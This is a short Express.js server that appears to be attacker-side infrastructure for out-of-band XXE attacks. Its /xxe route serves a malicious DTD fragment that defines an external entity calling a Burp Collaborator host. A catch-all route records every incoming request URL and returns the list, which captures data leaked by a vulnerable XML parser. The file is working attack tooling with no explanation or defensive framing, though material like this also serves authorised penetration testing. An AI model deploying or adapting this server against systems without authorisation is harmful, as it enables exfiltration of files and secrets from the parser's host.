const express = require('express')
const app = express()

var arr = []

app.get('/xxe', (req, res) => {
	res.header('Access-Control-Allow-Origin', '*')
	res.set('Content-Type', 'text/xml')
	res.send('<!ENTITY % param3 "<!ENTITY &#x25; exfil SYSTEM \'http://koc00vwz16o0n147iaq6427vamgdc11.burpcollaborator.net\'>">')
})

app.get('*', (req, res) => {
	const response = req.protocol + '://' + req.get('host') + req.originalUrl
	arr.push(response)
	res.send(arr)
})

app.listen(process.env.PORT || 3000, () => console.log('Example app listening on port 3000!'))